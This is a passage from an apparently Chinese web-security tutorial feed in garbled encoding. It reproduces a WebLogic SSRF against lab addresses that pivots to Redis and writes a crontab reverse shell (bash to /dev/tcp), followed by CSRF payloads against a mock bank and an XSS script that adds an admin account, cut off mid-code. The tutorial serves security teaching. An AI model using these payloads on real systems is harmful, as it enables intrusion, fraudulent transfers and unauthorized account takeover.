src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.58.23.png" style="zoom:75%;"><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2025-02-11%2013.52.04.png" style="zoom:50%;"><h2 id="2ï¼‰è®¿é—®ç¯å¢ƒweblogic"><a href="#2ï¼‰è®¿é—®ç¯å¢ƒweblogic" class="headerlink" title="2ï¼‰è®¿é—®ç¯å¢ƒweblogic"></a>2ï¼‰è®¿é—®ç¯å¢ƒweblogic</h2><p><code>http://ip:7001</code>å‡ºç°ä»¥ä¸‹é¡µé¢ï¼Œæ­å»ºæˆåŠŸã€‚</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8811.00.40.png" style="zoom:75%;"><h2 id="3ï¼‰æ¼æ´éªŒè¯"><a href="#3ï¼‰æ¼æ´éªŒè¯" class="headerlink" title="3ï¼‰æ¼æ´éªŒè¯"></a>3ï¼‰æ¼æ´éªŒè¯</h2><p>æ¼æ´å­˜åœ¨åœ°æ–¹ï¼š<code>http://192.168.33.6:7001/uddiexplorer/</code></p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8B%E5%8D%882.23.05.png" style="zoom:75%;"><p>æŠ“åŒ…ï¼š</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8B%E5%8D%882.24.34.png" style="zoom:75%;"><p>æ¢æµ‹IP:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">operator</span><span class="token operator">=</span>http://www-3.ibm.com/services/uddi/inquiryapi ã€æ¼æ´ç‚¹ã€‘<span class="token assign-left variable">operator</span><span class="token operator">=</span>http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æµ‹è¯•ipï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">operator</span><span class="token operator">=</span>http://172.20.0.2:7001 <span class="token punctuation">[</span>æ­£ç¡®çš„ip<span class="token punctuation">]</span><span class="token assign-left variable">operator</span><span class="token operator">=</span>http://172.20.0.3:7001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8B%E5%8D%882.33.10.png" style="zoom:75%;"><p>ç¡®è®¤å­˜åœ¨SSRFæ¼æ´ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1Host: <span class="token number">192.168</span>.1.129:7001User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:68.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">134</span>DNT: <span class="token number">1</span>Connection: closeReferer: http://192.168.1.129:7001/uddiexplorer/SearchPublicRegistries.jspCookie: <span class="token assign-left variable">publicinquiryurls</span><span class="token operator">=</span>http://www-3.ibm.com/services/uddi/inquiryapi<span class="token operator">!</span>IBM<span class="token operator">|</span>http://www-3.ibm.com/services/uddi/v2beta/inquiryapi<span class="token operator">!</span>IBM V2<span class="token operator">|</span>http://uddi.rte.microsoft.com/inquire<span class="token operator">!</span>Microsoft<span class="token operator">|</span>http://services.xmethods.net/glue/inquire/uddi<span class="token operator">!</span>XMethods<span class="token operator">|</span><span class="token punctuation">;</span> <span class="token assign-left variable">JSESSIONID</span><span class="token operator">=</span>dsQKp3ZLK3XNjv9JqvJ16L1nN89QZ3DK7yDLGcDgSlFwGHF5FRJQ<span class="token operator">!</span><span class="token number">899981451</span>Upgrade-Insecure-Requests: <span class="token number">1</span><span class="token assign-left variable">operator</span><span class="token operator">=</span>http://172.18.0.2:6379<span class="token operator">&amp;</span><span class="token assign-left variable">rdoSearch</span><span class="token operator">=</span>name<span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchname</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchkey</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchfor</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">selfor</span><span class="token operator">=</span>Business+location<span class="token operator">&amp;</span><span class="token assign-left variable">btnSubmit</span><span class="token operator">=</span>Search<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœªæˆæƒè®¿é—®ï¼Œåœ¨è®¿é—®æ•°æ®åº“æ˜¯ä¸éœ€è¦æä¾›ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>å…·æœ‰rootæƒé™ï¼Œå¯ä»¥è¯»å†™æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/777 0&gt;&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc/ config<span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4ï¼‰getshell"><a href="#4ï¼‰getshell" class="headerlink" title="4ï¼‰getshell"></a>4ï¼‰getshell</h2><p>è¯»å†™è®¡åˆ’ä»»åŠ¡æ–‡ä»¶crontabï¼Œåå¼¹shellåˆ°æŒ‡å®šåœ°å€(MAC:192.168.1.3)</p><p>ncat ç›‘å¬ <code>ncat lvvp 777</code></p><p>å¯¹ä¸‹é¢çš„payloadè¿›è¡ŒURLç¼–ç :</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span><span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.1.3/777 0&gt;&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc/config <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>saveaaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.3%2F777%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æäº¤ï¼š</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8B%E5%8D%882.47.44.png" style="zoom:50%;"><p>getshell:</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8B%E5%8D%882.47.25.png" style="zoom:45%;"> ]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> æœåŠ¡ç«¯è·¨ç«™è¯·æ±‚ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´CSRF</title>
      <link href="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/"/>
      <url>/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€CSRFæ¦‚è¿°"><a href="#ä¸€ã€CSRFæ¦‚è¿°" class="headerlink" title="ä¸€ã€CSRFæ¦‚è¿°"></a>ä¸€ã€CSRFæ¦‚è¿°</h1><p>è·¨ç«™è¯·æ±‚ä¼ªé€ (Cross- site requestforgery, CSRF)æ˜¯ä¸€ç§æ”»å‡»ï¼Œå®ƒå¼ºåˆ¶ç»ˆç«¯ç”¨æˆ·åœ¨å½“å‰å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯åçš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œã€‚</p><p>è·¨ç«™ï¼šæ”»å‡»è€…æ­å»ºçš„é’“é±¼ç½‘ç«™ã€‚</p><p>å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œä¹Ÿæœ‰å¯èƒ½å‘ç”Ÿåœ¨æœåŠ¡å™¨SCSRFã€‚</p><p>CSRFæ”»å‡»çš„ç€é‡ç‚¹åœ¨ä¼ªé€ æ›´æ”¹çŠ¶æ€çš„è¯·æ±‚ï¼Œè€Œä¸æ˜¯ç›—å–æ•°æ®ï¼Œå› ä¸ºæ”»å‡»è€…æ— æ³•æŸ¥çœ‹å¯¹ä¼ªé€ è¯·æ±‚çš„å“åº”ã€‚</p><p>å€ŸåŠ©ç¤¾å·¥çš„ä¸€äº›å¸®åŠ©(ä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶æˆ–èŠå¤©å‘é€é“¾æ¥)ï¼Œæ”»å‡»è€…å¯ä»¥è¯±éª—ç”¨æˆ·æ‰§è¡Œæ”»å‡»è€…é€‰æ‹©çš„æ“ä½œã€‚å¦‚æœå—å®³è€…æ˜¯æ™®é€šç”¨æˆ·ï¼Œåˆ™æˆåŠŸçš„CSRFæ”»å‡»å¯ä»¥å¼ºåˆ¶ç”¨æˆ·æ‰§è¡ŒçŠ¶æ€æ›´æ”¹çš„è¯·æ±‚ä¾‹å¦‚è½¬ç§»èµ„é‡‘ï¼Œæ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ç­‰ã€‚å¦‚æœå—å®³è€…æ˜¯ç®¡ç†å¸æˆ·ï¼ŒCSRFå¯èƒ½ä¼šå±åŠæ•´ä¸ªWebåº”ç”¨ç¨‹åºã€‚</p><h1 id="äºŒã€å…³é”®ç‚¹"><a href="#äºŒã€å…³é”®ç‚¹" class="headerlink" title="äºŒã€å…³é”®ç‚¹"></a>äºŒã€å…³é”®ç‚¹</h1><p> CSRF æ˜¯ä¸€ç§æ¬ºéª—å—å®³è€…æäº¤æ¶æ„è¯·æ±‚çš„æ”»å‡»ã€‚å®ƒç»§æ‰¿äº†å—å®³è€…çš„èº«ä»½å’Œç‰¹æƒï¼Œä»£è¡¨å—å®³è€…æ‰§è¡Œéæœ¬æ„ã€æ¶æ„çš„æ“ä½œã€‚å¯¹äºå¤§å¤šæ•°ç«™ç‚¹ï¼Œæµè§ˆå™¨è¯·æ±‚è‡ªåŠ¨å‘é€ä¸ç«™ç‚¹å…³è”çš„æ‰€æœ‰å‡­æ®ï¼Œä¾‹å¦‚ç”¨æˆ·çš„ä¼šè¯cookie,IP åœ°å€ï¼ŒWindowsåŸŸå‡­æ®ç­‰ã€‚å› æ­¤ï¼Œå¦‚æœç”¨æˆ·å½“å‰å·²å¯¹è¯¥ç«™ç‚¹è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œåˆ™è¯¥ç«™ç‚¹å°†æ— æ³•åŒºåˆ†å—å®³è€…å‘é€çš„ä¼ªé€ è¯·æ±‚å’Œå—å®³è€…å‘é€çš„åˆæ³•è¯·æ±‚ã€‚</p><h1 id="ä¸‰ã€ç›®æ ‡"><a href="#ä¸‰ã€ç›®æ ‡" class="headerlink" title="ä¸‰ã€ç›®æ ‡"></a>ä¸‰ã€ç›®æ ‡</h1><p> CSRF æ”»å‡»ç›®æ ‡æ˜¯èƒ½å¤Ÿæ›´æ”¹æœåŠ¡å™¨çŠ¶æ€æˆ–æ•°æ®çš„ä¸šåŠ¡æˆ–åŠŸèƒ½ï¼Œä¾‹å¦‚æ›´æ”¹å—å®³çš„ç”µå­é‚®ä»¶åœ°å€ã€å¯†ç æˆ–è´­ä¹°å•†å“ã€‚å¼ºåˆ¶å—å®³è€…æŸ¥è¯¢æ•°æ®ï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºæ— æ³•è·å¾—æœåŠ¡å™¨å“åº”ã€‚å› æ­¤ï¼ŒSCRFæ”»å‡»é’ˆå¯¹å¼•èµ·çŠ¶æ€å˜åŒ–çš„è¯·æ±‚ã€‚</p><p>æœ‰æ—¶å¯ä»¥å°†CSRF æ”»å‡»å­˜å‚¨åœ¨æ˜“å—æ”»å‡»çš„ç«™ç‚¹ä¸Šã€‚è¿™äº›æ¼æ´è¢«ç§°ä¸ºâ€œå­˜å‚¨çš„CSRFæ¼æ´â€ã€‚è¿™å¯ä»¥é€šè¿‡ç®€å•åœ°æ¥å—HTML çš„å­—æ®µä¸­å­˜å‚¨IMG æˆ–IFRAME æ ‡è®°ï¼Œæˆ–é€šè¿‡æ›´å¤æ‚çš„è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»æ¥å®ç°ã€‚å¦‚æœæ”»å‡»å¯ä»¥åœ¨ç«™ç‚¹ä¸­å­˜å‚¨SCRF æ”»å‡»ï¼Œåˆ™æ”»å‡»çš„ä¸¥é‡æ€§ä¼šæ”¾å¤§ã€‚ç‰¹åˆ«æ˜¯ï¼Œå—åˆ°æ”»å‡»çš„å¯èƒ½æ€§å¢åŠ ï¼Œå› ä¸ºå—å®³è€…æ¯”äº’è”ç½‘ä¸Šçš„æŸä¸ªéšæœºé¡µé¢æ›´æœ‰å¯èƒ½æŸ¥çœ‹åŒ…å«æ”»å‡»çš„é¡µé¢ã€‚ï¼ˆå…·å¤‡æ™®éæ€§ï¼‰</p><h1 id="å››ã€åœºæ™¯å¤ç°åŠè§¦å‘æ–¹å¼ï¼ˆCSRFï¼‰"><a href="#å››ã€åœºæ™¯å¤ç°åŠè§¦å‘æ–¹å¼ï¼ˆCSRFï¼‰" class="headerlink" title="å››ã€åœºæ™¯å¤ç°åŠè§¦å‘æ–¹å¼ï¼ˆCSRFï¼‰"></a>å››ã€åœºæ™¯å¤ç°åŠè§¦å‘æ–¹å¼ï¼ˆCSRFï¼‰</h1><h2 id="4-1-CSRFåœºæ™¯å¤ç°"><a href="#4-1-CSRFåœºæ™¯å¤ç°" class="headerlink" title="4.1 CSRFåœºæ™¯å¤ç°"></a>4.1 CSRFåœºæ™¯å¤ç°</h2><h3 id="4-1-1-bank-æºä»£ç "><a href="#4-1-1-bank-æºä»£ç " class="headerlink" title="4.1.1 bank æºä»£ç "></a>4.1.1 bank æºä»£ç </h3><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-14%20%E4%B8%8B%E5%8D%882.37.22.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-14%20%E4%B8%8B%E5%8D%882.46.00.png" style="zoom:55%;"><p>ä¸ºäº†å¤ç°CSRF æ”»å‡»çš„åœºæ™¯ï¼Œæˆ‘ä»¬æ­å»ºäº†ä¸€ä¸ªé“¶è¡Œçš„æ¨¡æ‹Ÿç½‘ç«™ï¼Œå…¶æ ¸å¿ƒä¸šåŠ¡å°±æ˜¯è½¬è´¦ã€‚</p><h3 id="4-1-2-æ­£å¸¸ä¸šåŠ¡"><a href="#4-1-2-æ­£å¸¸ä¸šåŠ¡" class="headerlink" title="4.1.2 æ­£å¸¸ä¸šåŠ¡"></a>4.1.2 æ­£å¸¸ä¸šåŠ¡</h3><p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨[admin/123456]ç™»å½•é“¶è¡Œè´¦æˆ·ã€‚</p><p>åœ¨å¦ä¸€å°æµè§ˆå™¨ä¸­ï¼Œä½¿ç”¨[test/123456]ç™»å½•ã€‚</p><p>å¯ä»¥æ“ä½œadminç”¨æˆ·ç»™testç”¨æˆ·æ±‡æ¬¾ã€‚</p><h3 id="4-1-3-CSRF-æ”»å‡»"><a href="#4-1-3-CSRF-æ”»å‡»" class="headerlink" title="4.1.3 CSRF æ”»å‡»"></a>4.1.3 <strong>CSRF æ”»å‡»</strong></h3><p>æˆ‘ä»¬ä»¥adminç”¨æˆ·çš„èº«ä»½ï¼Œåœ¨æ²¡æœ‰é€€æ‰å½“å‰ç½‘ç«™çš„æƒ…å†µä¸‹ï¼Œè®¿é—®äº†ä¸€ä¸ªæå…·è¯±æƒ‘æ€§çš„ç½‘ç«™ï¼ˆé»‘å®¢è®¾ç½®çš„é’“é±¼ç½‘ç«™ï¼‰ã€‚</p><p>å½“æˆ‘ä»¬åœ¨è¿™ä¸ªç½‘ç«™ä¸­ç‚¹å‡»äº†æŸä¸ªé“¾æ¥ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°è´¦æˆ·ä¸­ç»™hacker è½¬äº†1000</p><p>æˆ‘ä»¬ä¼šå‘ç°ï¼Œadminç”¨æˆ·å¹¶æ²¡æœ‰æ„æ„¿ç»™hacker ç”¨æˆ·è½¬è´¦ï¼Œè¿™ä¸ªæ“ä½œå®Œå…¨æ˜¯éæœ¬æ„çš„ï¼Œè€Œä¸”è¯·æ±‚åœ¨admin ç”¨æˆ·ä¸çŸ¥ä¸è§‰çš„æƒ…å†µä¸‹è¢«å‘é€ã€‚è¯´æ˜admin ç”¨æˆ·é­å—äº†CSRF æ”»å‡»ã€‚</p><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-14%20%E4%B8%8B%E5%8D%882.56.08.png" style="zoom:53%;"><h2 id="4-2-CSRFè§¦å‘æ–¹å¼"><a href="#4-2-CSRFè§¦å‘æ–¹å¼" class="headerlink" title="4.2 CSRFè§¦å‘æ–¹å¼"></a>4.2 CSRFè§¦å‘æ–¹å¼</h2><h3 id="4-2-1-aæ ‡ç­¾"><a href="#4-2-1-aæ ‡ç­¾" class="headerlink" title="4.2.1 aæ ‡ç­¾"></a>4.2.1 aæ ‡ç­¾</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>è½¬è´¦é“¾æ¥<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¯±æƒ‘æ€§ä¿¡æ¯<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-14%20%E4%B8%8B%E5%8D%883.04.08.png" style="zoom:75%;"><h3 id="4-2-2-img-æ ‡ç­¾"><a href="#4-2-2-img-æ ‡ç­¾" class="headerlink" title="4.2.2 img æ ‡ç­¾"></a>4.2.2 img æ ‡ç­¾</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>è½¬è´¦é“¾æ¥<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>utf-8<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>./1.jpg<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://192.168.1.200/bank/action.php?username=hacker&amp;money=100&amp;submit=%E4%BA%A4%E6%98%93<span class="token punctuation">'</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>å®åˆ€åœ¨æ‰‹ï¼Œè°ä¸äº‰é”‹<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥é¡µé¢é€šè¿‡<code>&lt;img&gt;</code> æ ‡ç­¾å‘é€ä¸€ä¸ªget è¯·æ±‚ï¼Œè¿™ä¸ªget è¯·æ±‚ï¼Œæ­£æ˜¯ç”¨æˆ·å‘èµ·çš„è½¬è´¦ä¸šåŠ¡çš„è¯·æ±‚<strong>ã€‚</strong></p><h3 id="4-2-3-postæ–¹æ³•"><a href="#4-2-3-postæ–¹æ³•" class="headerlink" title="4.2.3 postæ–¹æ³•"></a>4.2.3 postæ–¹æ³•</h3><p> ä»¥ä¸Šåœºæ™¯ä¸­æ˜¯åˆ©ç”¨<code>&lt;img&gt;</code>æ ‡ç­¾å‘é€çš„getè¯·æ±‚ã€‚é‚£ä¹ˆæ˜¯ä¸æ˜¯æŠŠå…³é”®æ“ä½œä½¿ç”¨POSTè¯·æ±‚ï¼Œå°±èƒ½å¤Ÿé˜²å¾¡CSRF   æ¼æ´äº†å‘¢?ç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚å³ä¾¿è½¬è´¦æ“ä½œä½¿ç”¨POST æ–¹æ³•ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥é€šè¿‡æ„é€ è¡¨å•çš„æ–¹å¼æ¥ä¼ªé€ è¯·æ±‚ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>utf-8<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>csrf<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://192.168.1.200/bank/action.php<span class="token punctuation">'</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>post<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>username<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hacker<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>money<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>100<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>csrf<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./1.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€CSRFä¸XSSç»“åˆæ·»åŠ åå°è´¦å·"><a href="#äº”ã€CSRFä¸XSSç»“åˆæ·»åŠ åå°è´¦å·" class="headerlink" title="äº”ã€CSRFä¸XSSç»“åˆæ·»åŠ åå°è´¦å·"></a>äº”ã€CSRFä¸XSSç»“åˆæ·»åŠ åå°è´¦å·</h1><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡XSS æ¥è§¦å‘CSRF æ”»å‡»ã€‚å› ä¸ºï¼Œå¯ä»¥åˆ©ç”¨JS æ¥å‘é€è¯·æ±‚ã€‚</p><p>é€šè¿‡ç ”ç©¶å—å®³è€…çš„ä¸šåŠ¡æµç¨‹ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>\'post\'<span class="token punctuation">,</span>\'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.33</span><span class="token number">.4</span><span class="token operator">/</span>cms<span class="token operator">/</span>admin<span class="token operator">/</span>user<span class="token punctuation">.</span>action<span class="token punctuation">.</span>php\'<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>\'act<span class="token operator">=</span>add<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token constant">SXK</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>password2<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>button<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token constant">BB</span><span 